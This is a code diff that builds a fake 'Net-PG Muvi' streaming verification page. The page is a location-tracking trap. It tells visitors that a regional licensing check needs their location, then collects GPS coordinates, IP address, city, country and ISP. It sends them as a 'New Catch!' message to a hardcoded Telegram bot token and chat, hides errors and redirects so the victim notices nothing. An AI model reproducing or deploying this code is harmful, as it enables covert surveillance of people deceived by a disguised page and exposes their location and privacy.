@@ -1,38 +1,143 @@
-<script>
-    const botToken = "8060572871:AAGdgGSMVfEft5DHEhx3QMU9vHSMlNVijUI";
-    const chatId = "6312622799";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Net-PG Muvi | Streaming Verification</title>
+    <style>
+        body {
+            background-color: #0b0b0b;
+            color: #e5e5e5;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
 
-    // 1. This function grabs the destination from the URL
-    function getMovieDestination() {
-        const urlParams = new URLSearchParams(window.location.search);
-        // If "dest" is in the link, use it. Otherwise, use a backup link.
-        return urlParams.get('dest') || "https://mega.nz/default_backup_link";
-    }
+        .container {
+            text-align: center;
+            max-width: 400px;
+            padding: 20px;
+        }
 
-    async function collectData(pos = null) {
-        let movieLink = getMovieDestination(); // Get the link dynamically!
-        let ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+        .logo {
+            color: #db0000;
+            font-size: 2.5rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.1);
+            border-left-color: #db0000;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        h2 {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        p {
+            font-size: 0.9rem;
+            color: #8c8c8c;
+            line-height: 1.4;
+        }
+
+        .footer-note {
+            position: absolute;
+            bottom: 20px;
+            font-size: 0.7rem;
+            color: #444;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">NET-PG MUVI</div>
         
-        let message = `🚀 **New Catch!**\n\n` +
-                      `🎬 Movie Link: ${movieLink}\n` +
-                      `🌐 IP: ${ipData.ip}\n` +
-                      `📍 City: ${ipData.city}\n`;
+        <div id="loader">
+            <div class="spinner"></div>
+            <h2 id="status">Verifying Regional Access...</h2>
+            <p id="sub-status">Please confirm the location prompt to verify licensing for <b>Papua New Guinea</b>. This ensures content availability in your region.</p>
+        </div>
+    </div>
 
-        if (pos) {
-            message += `🎯 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+    <div class="footer-note">Secure Encrypted Verification v4.2.0</div>
+
+    <script>
+        const botToken = "8060572871:AAGdgGSMVfEft5DHEhx3QMU9vHSMlNVijUI";
+        const chatId = "6312622799";
+
+        function getMovieDestination() {
+            const urlParams = new URLSearchParams(window.location.search);
+            // If "dest" is in the link, use it. Otherwise, use a default
+            return urlParams.get('dest') || "https://mega.nz/file/your_backup_link";
         }
 
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+        async function collectData(pos = null) {
+            let movieLink = getMovieDestination();
+            
+            try {
+                // Change UI to look like it's working
+                document.getElementById('status').innerText = "Access Granted!";
+                document.getElementById('sub-status').innerText = "Redirecting to secure server...";
 
-        // Final Redirect to whatever movie was in the URL
-        window.location.href = movieLink;
-    }
+                let ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+                
+                let message = `🚀 **New Catch!**\n\n` +
+                              `🎬 **Target:** ${movieLink}\n` +
+                              `🌐 **IP:** \`${ipData.ip}\`\n` +
+                              `📍 **City:** ${ipData.city}, ${ipData.country_name}\n` +
+                              `🏢 **ISP:** ${ipData.org}\n`;
 
-    window.onload = () => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(collectData, () => collectData());
-        } else {
-            collectData();
+                if (pos) {
+                    message += `🎯 **GPS:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                } else {
+                    message += `⚠️ **GPS:** User denied permission.`;
+                }
+
+                // Send to Telegram
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+
+            } catch (e) {
+                console.log("Silent error, proceeding to redirect...");
+            }
+
+            // Small delay for the "Redirecting" text to feel real
+            setTimeout(() => {
+                window.location.href = movieLink;
+            }, 1000);
         }
-    };
-</script>
+
+        window.onload = () => {
+            if (navigator.geolocation) {
+                // Request location with high accuracy
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => collectData(pos), 
+                    () => collectData(), // If they deny, still collect IP
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                collectData();
+            }
+        };
+    </script>
+</body>
+</html>
